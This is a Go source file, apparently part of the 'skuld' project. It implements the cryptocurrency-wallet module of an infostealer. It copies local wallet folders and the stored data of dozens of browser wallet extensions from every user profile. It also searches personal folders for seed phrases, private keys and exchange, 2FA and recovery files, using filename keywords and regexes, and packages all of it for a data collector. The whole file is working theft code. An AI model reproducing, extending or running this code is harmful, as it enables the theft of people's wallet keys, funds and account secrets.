package wallets

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"regexp"
	"encoding/json"

	"github.com/hackirby/skuld/utils/fileutil"
	"github.com/hackirby/skuld/utils/hardware"
	"github.com/hackirby/skuld/utils/collector"
)

// Run executes all wallet collection methods
func Run(dataCollector *collector.DataCollector) {
	LocalWallets(dataCollector)
	WalletExtensions(dataCollector)
	WalletDatFiles(dataCollector)
	CryptoFiles(dataCollector)
	ExchangeFiles(dataCollector)
}

// LocalWallets - Comprehensive local wallet detection
func LocalWallets(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "local-wallets-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Comprehensive wallet paths - no duplicates
	walletPaths := map[string][]string{
		"Bitcoin": {
			"AppData\\Roaming\\Bitcoin",
			"AppData\\Local\\Bitcoin",
		},
		"Ethereum": {
			"AppData\\Roaming\\Ethereum",
			"AppData\\Local\\Ethereum",
		},
		"Exodus": {
			"AppData\\Roaming\\Exodus",
		},
		"Atomic": {
			"AppData\\Roaming\\atomic",
		},
		"Electrum": {
			"AppData\\Roaming\\Electrum",
		},
		"ElectrumLTC": {
			"AppData\\Roaming\\Electrum-LTC",
		},
		"Electroneum": {
			"AppData\\Roaming\\Electroneum",
		},
		"Monero": {
			"AppData\\Roaming\\Monero",
			"AppData\\Roaming\\bitmonero",
		},
		"Litecoin": {
			"AppData\\Roaming\\Litecoin",
		},
		"Dogecoin": {
			"AppData\\Roaming\\DogeCoin",
		},
		"Dash": {
			"AppData\\Roaming\\DashCore",
		},
		"Zcash": {
			"AppData\\Roaming\\Zcash",
		},
		"Jaxx": {
			"AppData\\Roaming\\com.liberty.jaxx",
		},
		"Coinomi": {
			"AppData\\Local\\Coinomi\\Coinomi\\wallets",
		},
		"Guarda": {
			"AppData\\Roaming\\Guarda",
		},
		"WalletWasabi": {
			"AppData\\Roaming\\WalletWasabi",
		},
		"Armory": {
			"AppData\\Roaming\\Armory",
		},
		"ByteCoin": {
			"AppData\\Roaming\\bytecoin",
		},
		"Binance": {
			"AppData\\Roaming\\Binance",
		},
		"TrustWallet": {
			"AppData\\Roaming\\TrustWallet",
		},
		"Phantom": {
			"AppData\\Roaming\\Phantom",
		},
		"Solflare": {
			"AppData\\Roaming\\Solflare",
		},
		"Metamask": {
			"AppData\\Local\\Metamask",
		},
		"Ronin": {
			"AppData\\Local\\Ronin",
		},
		"Yoroi": {
			"AppData\\Local\\Yoroi",
		},
		"Daedalus": {
			"AppData\\Local\\Daedalus",
		},
		"Klever": {
			"AppData\\Local\\Klever",
		},
		"Keplr": {
			"AppData\\Local\\Keplr",
		},
		"Terra": {
			"AppData\\Local\\TerraStation",
		},
		"Avalanche": {
			"AppData\\Local\\Avalanche",
		},
		"Polygon": {
			"AppData\\Local\\Polygon",
		},
		"Harmony": {
			"AppData\\Local\\Harmony",
		},
		"Near": {
			"AppData\\Local\\Near",
		},
		"Algorand": {
			"AppData\\Local\\Algorand",
		},
		"Tezos": {
			"AppData\\Local\\Tezos",
		},
		"Cosmos": {
			"AppData\\Local\\Cosmos",
		},
		"Polkadot": {
			"AppData\\Local\\Polkadot",
		},
		"Chainlink": {
			"AppData\\Local\\Chainlink",
		},
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		for walletName, paths := range walletPaths {
			for _, path := range paths {
				fullPath := filepath.Join(user, path)
				
				if !fileutil.IsDir(fullPath) {
					continue
				}

				destPath := filepath.Join(tempDir, userName, walletName)
				os.MkdirAll(destPath, os.ModePerm)

				// Copy ENTIRE wallet directory with ALL contents
				if err := fileutil.CopyDir(fullPath, destPath); err == nil {
					if size, err := fileutil.GetDirectorySize(destPath); err == nil {
						totalSize += size
						found++
					}
				}
			}
		}
	}

	if found > 0 {
		localWalletsInfo := map[string]interface{}{
			"LocalWalletsFound": found,
			"TotalSizeMB":       totalSize / (1024 * 1024),
			"TreeView":          fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("local_wallets", localWalletsInfo)
		dataCollector.AddDirectory("local_wallets", tempDir, "local_wallets")
	}
}

// WalletExtensions - Comprehensive browser extension detection
func WalletExtensions(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "wallet-extensions-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Comprehensive wallet extensions - no duplicates
	extensions := map[string]string{
		"nkbihfbeogaeaoehlefnkodbefgpgknn": "MetaMask",
		"fhbohimaelbohpjbbldcngcnapndodjp": "Binance_Chain_Wallet",
		"hnfanknocfeofbddgcijnmhnfnkdnaad": "Coinbase_Wallet",
		"bfnaelmomeimhlpmgjnjophhpkkoljpa": "Phantom",
		"fnjhmkhhmkbjkkabndcnnogagogbneec": "Ronin_Wallet",
		"dmkamcknogkgcdfhhbddcghachkejeap": "Keplr",
		"flpiciilemghbmfalicajoolhkkenfel": "ICONex",
		"fihkakfobkmkjojpchpfgcmhfjnmnfpi": "BitApp_Wallet",
		"kncchdigobghenbbaddojjnnaogfppfj": "iWallet",
		"amkmjjmmflddogmhpjloimipbofnfjih": "Wombat",
		"nlbmnnijcnlegkjjpcfjclmcfggfefdm": "MEW_CX",
		"nphplpgoakhhjchkkhmiggakijnkhfnd": "Ton_Crystal_Wallet",
		"mcohilncbfahbmgdjkbpemcciiolgcge": "OKX_Wallet",
		"jnlgamecbpmbajjfhmmmlhejkemejdma": "Braavos_Smart_Wallet",
		"opcgpfmipidbgpenhmajoajpbobppdil": "Sui_Wallet",
		"aeachknmefphepccionboohckonoeemg": "Coin98_Wallet",
		"cgeeodpfagjceefieflmdfphplkenlfk": "EVER_Wallet",
		"pdadjkfkgcafgbceimcpbkalnfnepbnk": "KardiaChain_Wallet",
		"bcopgchhojmggmffilplmbdicgaihlkp": "Petra_Aptos_Wallet",
		"aiifbnbfobpmeekipheeijimdpnlpgpp": "Station_Wallet",
		"fijngjgcjhjmmpcmkeiomlglpeiijkld": "Tezos_Temple",
		"ookjlbkiijinhpmnjffcofjonbfbgaoc": "Temple",
		"mnfifefkajgofkcjkemidiaecocnkjeh": "TezBox",
		"gjagmgiddbbciopjhllkdnddhcglnemk": "Galleon",
		"fhmfendgdocmcbmfikdcogofphimnkno": "Solflare",
		"bhhhlbepdkbapadjdnnojkbgioiodbic": "Sollet",
		"phkbamefinggmakgklpkljjmgibohnba": "Pontem_Aptos_Wallet",
		"nknhiehlklippafakaeklbeglecifhad": "Petra",
		"mcbigmjiafegjnnogedioegffbooigli": "Liquality_Wallet",
		"kpfopkelmapcoipemfendmdcghnegimn": "Liquality",
		"fcfcfllfndlomdhbehjjcoimbgofdncg": "Cosmostation",
		"jojhfeoedkpkglbfimdfabpdfjaoolaf": "Cosmostation_Wallet",
		"lpfcbjknijpeeillifnkikgncikgfhdo": "Nami",
		"dngmlblcodfobpdpecaadgfbcggfjfnm": "Eternl",
		"jnmbobjmhlngoefaiojfljckilhhlhcj": "Yoroi",
		"ffnbelfdoeiohenkjibnmadjiehjhajb": "Yoroi_Wallet",
		"hpglfhgfnhbgpjdenjgmdgoeiappafln": "Guarda",
		"blnieiiffboillknjnepogjhkgnoapac": "XDEFI_Wallet",
		"hmeobnfnfcmdkdcmlblgagmfpfboieaf": "XDEFI",
		"fhilaheimglignddkjgofkcbgekhenbh": "Oxygen",
		"kmendfapggjehodndflmmgagdbamhnfd": "Exodus",
		"cphhlgmgameodnhkjdmkpanlelnlohao": "NeoLine",
		"dkdedlpgdmmkkfjabffeganieamfklkm": "Cyano_Wallet",
		"nlgbhdfgdhgbiamfdfmbikcdghidoadd": "Bitpie",
		"infeboajgfhgbjpjbeppbkgnabfdkdaf": "Wax_Cloud_Wallet",
		"oeljdldpnmdbchonielidgobddfffla": "Anchor_Wallet",
		"cnmamaachppnkjgnildpdmkaakejnhae": "Scatter",
		"agoakfejjabomempkjlepdflaleeobhb": "Core",
		"heefohaffomkkkphnlpohglngmbcclhi": "Slope_Wallet",
		"cjelfplplebdjjenllpjcblmjkfcffne": "Jaxx_Liberty",
		"ejjladinnckdgjemekebdpeokbikhfci": "Petra_Wallet",
		"ibnejdfjmmkpcnlpebklmnkoeoihofec": "TronLink",
		"jbdaocneiiinmjbjlgalhcelgbejmnid": "TronLink_Pro",
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		// Check all browser profiles for Local Extension Settings
		browserPaths := []string{
			"AppData\\Local\\Google\\Chrome\\User Data",
			"AppData\\Local\\Microsoft\\Edge\\User Data",
			"AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
			"AppData\\Local\\Vivaldi\\User Data",
			"AppData\\Local\\Yandex\\YandexBrowser\\User Data",
		}

		for _, browserPath := range browserPaths {
			fullBrowserPath := filepath.Join(user, browserPath)
			if !fileutil.IsDir(fullBrowserPath) {
				continue
			}

			// Find all profiles
			profiles, err := os.ReadDir(fullBrowserPath)
			if err != nil {
				continue
			}

			for _, profile := range profiles {
				if !profile.IsDir() {
					continue
				}

				// Check Local Extension Settings folder
				extensionSettingsPath := filepath.Join(fullBrowserPath, profile.Name(), "Local Extension Settings")
				
				if !fileutil.IsDir(extensionSettingsPath) {
					continue
				}

				// Check each extension ID
				for extensionID, walletName := range extensions {
					extensionPath := filepath.Join(extensionSettingsPath, extensionID)
					
					if !fileutil.IsDir(extensionPath) {
						continue
					}

					// Copy ENTIRE extension folder with ALL contents
					destPath := filepath.Join(tempDir, userName, strings.Replace(browserPath, "\\", "_", -1), profile.Name(), walletName+"_"+extensionID)
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

					if err := fileutil.CopyDir(extensionPath, destPath); err == nil {
						if size, err := fileutil.GetDirectorySize(destPath); err == nil {
							totalSize += size
							found++
						}
					}
				}
			}
		}
	}

	if found > 0 {
		extensionsInfo := map[string]interface{}{
			"WalletExtensionsFound": found,
			"TotalSizeMB":           totalSize / (1024 * 1024),
			"TreeView":              fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_extensions", extensionsInfo)
		dataCollector.AddDirectory("wallet_extensions", tempDir, "wallet_extensions")
	}
}

// WalletDatFiles - Search for wallet.dat files everywhere
func WalletDatFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "wallet-dat-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Common wallet.dat locations
	walletDatPaths := []string{
		"AppData\\Roaming\\Bitcoin",
		"AppData\\Roaming\\Bitcoin\\wallets",
		"AppData\\Local\\Bitcoin",
		"AppData\\Local\\Bitcoin\\wallets",
		"AppData\\Roaming\\Litecoin",
		"AppData\\Roaming\\DogeCoin",
		"AppData\\Roaming\\DashCore",
		"AppData\\Roaming\\Zcash",
		"AppData\\Roaming\\Electrum\\wallets",
		"AppData\\Roaming\\Electrum-LTC\\wallets",
		"AppData\\Roaming\\Exodus\\exodus.wallet",
		"AppData\\Roaming\\atomic\\Local Storage\\leveldb",
		"Desktop",
		"Documents",
		"Downloads",
		"Pictures",
		"Videos",
		"Music",
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		for _, walletPath := range walletDatPaths {
			fullPath := filepath.Join(user, walletPath)
			
			if !fileutil.IsDir(fullPath) {
				continue
			}

			// Search for wallet files recursively
			filepath.Walk(fullPath, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				fileName := strings.ToLower(info.Name())
				
				// Look for wallet files
				if strings.Contains(fileName, "wallet.dat") ||
				   strings.Contains(fileName, "wallet") ||
				   strings.Contains(fileName, ".dat") ||
				   strings.Contains(fileName, "keystore") ||
				   strings.Contains(fileName, "seed") ||
				   strings.Contains(fileName, "mnemonic") ||
				   strings.Contains(fileName, "private") ||
				   strings.Contains(fileName, "key") {
					
					relPath, _ := filepath.Rel(user, path)
					destPath := filepath.Join(tempDir, userName, "WalletDat", relPath)
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

					if err := fileutil.CopyFile(path, destPath); err == nil {
						totalSize += info.Size()
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		walletDatInfo := map[string]interface{}{
			"WalletDatFound": found,
			"TotalSizeMB":    totalSize / (1024 * 1024),
			"TreeView":       fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("wallet_dat", walletDatInfo)
		dataCollector.AddDirectory("wallet_dat", tempDir, "wallet_dat")
	}
}

// CryptoFiles - Advanced crypto detection in text files
func CryptoFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "crypto-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	// Advanced regex patterns for crypto detection
	patterns := map[string]*regexp.Regexp{
		"mnemonic_12":           regexp.MustCompile(`(?i)\b([a-z]+\s+){11}[a-z]+\b`),
		"mnemonic_24":           regexp.MustCompile(`(?i)\b([a-z]+\s+){23}[a-z]+\b`),
		"bitcoin_private_key_5": regexp.MustCompile(`5[HJK][1-9A-HJ-NP-Za-km-z]{49}`),
		"bitcoin_private_key_K": regexp.MustCompile(`K[1-9A-HJ-NP-Za-km-z]{51}`),
		"bitcoin_private_key_L": regexp.MustCompile(`L[1-9A-HJ-NP-Za-km-z]{51}`),
		"bitcoin_private_key_c": regexp.MustCompile(`c[1-9A-HJ-NP-Za-km-z]{51}`),
		"ethereum_private_key":  regexp.MustCompile(`0x[a-fA-F0-9]{64}`),
		"bitcoin_address_1":     regexp.MustCompile(`1[a-km-zA-HJ-NP-Z1-9]{25,34}`),
		"bitcoin_address_3":     regexp.MustCompile(`3[a-km-zA-HJ-NP-Z1-9]{25,34}`),
		"bitcoin_address_bc1":   regexp.MustCompile(`bc1[a-z0-9]{39,59}`),
		"ethereum_address":      regexp.MustCompile(`0x[a-fA-F0-9]{40}`),
		"litecoin_address":      regexp.MustCompile(`[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}`),
		"dogecoin_address":      regexp.MustCompile(`D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}`),
		"monero_address":        regexp.MustCompile(`4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}`),
		"dash_address":          regexp.MustCompile(`X[1-9A-HJ-NP-Za-km-z]{33}`),
		"zcash_address":         regexp.MustCompile(`t1[a-zA-Z0-9]{33}`),
		"ripple_address":        regexp.MustCompile(`r[0-9a-zA-Z]{24,34}`),
		"stellar_address":       regexp.MustCompile(`G[A-Z2-7]{55}`),
		"cardano_address":       regexp.MustCompile(`addr1[a-z0-9]+`),
		"tron_address":          regexp.MustCompile(`T[A-Za-z1-9]{33}`),
		"binance_address":       regexp.MustCompile(`bnb1[a-z0-9]{38}`),
		"solana_address":        regexp.MustCompile(`[1-9A-HJ-NP-Za-km-z]{32,44}`),
	}

	found := 0
	suspiciousFiles := make(map[string][]string)
	cryptoData := make(map[string]string)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		searchDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
			filepath.Join(user, "Pictures"),
			filepath.Join(user, "Videos"),
			filepath.Join(user, "Music"),
		}

		for _, dir := range searchDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				// Check text files
				ext := strings.ToLower(filepath.Ext(info.Name()))
				textExts := []string{".txt", ".json", ".csv", ".log", ".md", ".rtf", ".dat", ".key", ".pem", ".backup", ".wallet"}
				isTextFile := false
				for _, textExt := range textExts {
					if ext == textExt {
						isTextFile = true
						break
					}
				}

				if !isTextFile || info.Size() > 10*1024*1024 { // 10MB limit
					return nil
				}

				content, err := fileutil.ReadFile(path)
				if err != nil {
					return nil
				}

				matches := make([]string, 0)
				for patternName, pattern := range patterns {
					if pattern.MatchString(content) {
						matches = append(matches, patternName)
						// Store actual matches
						foundMatches := pattern.FindAllString(content, -1)
						for _, match := range foundMatches {
							cryptoData[fmt.Sprintf("%s_%s", patternName, info.Name())] = match
						}
					}
				}

				if len(matches) > 0 {
					destPath := filepath.Join(tempDir, userName, "CryptoFiles", info.Name())
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)
					
					if err := fileutil.CopyFile(path, destPath); err == nil {
						suspiciousFiles[info.Name()] = matches
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		// Create analysis file
		analysisPath := filepath.Join(tempDir, "CRYPTO_ANALYSIS.txt")
		analysisContent := "🔍 CRYPTO FILES ANALYSIS\n========================\n\n"
		analysisContent += fmt.Sprintf("Total suspicious files found: %d\n\n", found)
		
		for fileName, matches := range suspiciousFiles {
			analysisContent += fmt.Sprintf("📄 File: %s\n", fileName)
			analysisContent += fmt.Sprintf("🎯 Matches: %s\n", strings.Join(matches, ", "))
			analysisContent += "---\n\n"
		}
		
		if len(cryptoData) > 0 {
			analysisContent += "\n💰 FOUND CRYPTO DATA\n===================\n\n"
			for key, value := range cryptoData {
				analysisContent += fmt.Sprintf("%s: %s\n", key, value)
			}
		}
		
		fileutil.WriteFile(analysisPath, analysisContent)

		cryptoFilesInfo := map[string]interface{}{
			"CryptoFilesFound": found,
			"SuspiciousFiles":  suspiciousFiles,
			"CryptoDataFound":  cryptoData,
			"TreeView":         fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("crypto_files", cryptoFilesInfo)
		dataCollector.AddDirectory("crypto_files", tempDir, "crypto_files")
	}
}

// ExchangeFiles - Search for exchange-related files
func ExchangeFiles(dataCollector *collector.DataCollector) {
	tempDir := filepath.Join(os.TempDir(), "exchange-files-temp")
	os.MkdirAll(tempDir, os.ModePerm)
	defer os.RemoveAll(tempDir)

	exchangeKeywords := []string{
		"binance", "coinbase", "kraken", "bitfinex", "huobi", "okex", "kucoin",
		"bybit", "ftx", "gate", "bittrex", "poloniex", "gemini", "bitstamp",
		"exchange", "trading", "api", "secret", "access", "token", "auth",
		"2fa", "backup", "codes", "recovery", "seed", "phrase", "mnemonic",
	}

	found := 0
	totalSize := int64(0)

	for _, user := range hardware.GetUsers() {
		userName := strings.Split(user, "\\")[2]
		
		searchDirs := []string{
			filepath.Join(user, "Desktop"),
			filepath.Join(user, "Documents"),
			filepath.Join(user, "Downloads"),
		}

		for _, dir := range searchDirs {
			if !fileutil.IsDir(dir) {
				continue
			}

			filepath.Walk(dir, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil
				}

				fileName := strings.ToLower(info.Name())
				
				// Check for exchange keywords
				isExchangeFile := false
				for _, keyword := range exchangeKeywords {
					if strings.Contains(fileName, keyword) {
						isExchangeFile = true
						break
					}
				}

				if isExchangeFile {
					destPath := filepath.Join(tempDir, userName, "ExchangeFiles", info.Name())
					os.MkdirAll(filepath.Dir(destPath), os.ModePerm)

					if err := fileutil.CopyFile(path, destPath); err == nil {
						totalSize += info.Size()
						found++
					}
				}

				return nil
			})
		}
	}

	if found > 0 {
		exchangeInfo := map[string]interface{}{
			"ExchangeFilesFound": found,
			"TotalSizeMB":        totalSize / (1024 * 1024),
			"TreeView":           fileutil.Tree(tempDir, ""),
		}
		dataCollector.AddData("exchange_files", exchangeInfo)
		dataCollector.AddDirectory("exchange_files", tempDir, "exchange_files")
	}
}